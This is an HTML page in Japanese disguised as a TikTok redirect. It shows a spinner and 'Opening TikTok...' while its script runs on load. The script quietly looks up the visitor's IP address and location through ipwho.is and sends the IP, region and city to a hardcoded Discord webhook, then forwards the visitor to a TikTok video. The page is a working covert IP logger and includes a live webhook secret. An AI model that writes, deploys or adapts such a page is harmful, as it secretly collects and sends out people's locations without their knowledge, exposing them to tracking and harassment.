<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok - Redirecting...</title>
    <style>
        body { margin: 0; background-color: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #fe2c55; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .container { text-align: center; }
    </style>
</head>
<body>
    <div class="container">
        <div class="loader"></div>
        <p>TikTokを開いています...</p>
    </div>

    <script>
        // 設定
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1496426741068202024/_p47MrXmw96zzzlw_-eN15stpsWHCptYKK3byQCoUofsD-AllITmfui1Q4b0sUaRO5zU";
        const REDIRECT_URL = "https://www.tiktok.com/@sakonji_jrfv/video/7625181468586790162?is_from_webapp=1&sender_device=pc&web_id=7621142624386418184";

        async function start() {
            // 3秒後に強制移動するタイマー（何があっても絶対に飛ばす）
            setTimeout(() => { window.location.href = REDIRECT_URL; }, 3000);

            try {
                // IP情報を取得
                const res = await fetch('https://ipwho.is/').catch(() => null);
                if (!res) return;
                const data = await res.json();

                // Discordに送信
                if (data && data.success && WEBHOOK_URL) {
                    fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            content: `✅ **アクセス検出成功**\nIP: ${data.ip}\n場所: ${data.region} ${data.city}`
                        })
                    }).catch(() => {});
                }
            } catch (e) {}
        }

        // 実行
        start();
    </script>
</body>
</html>
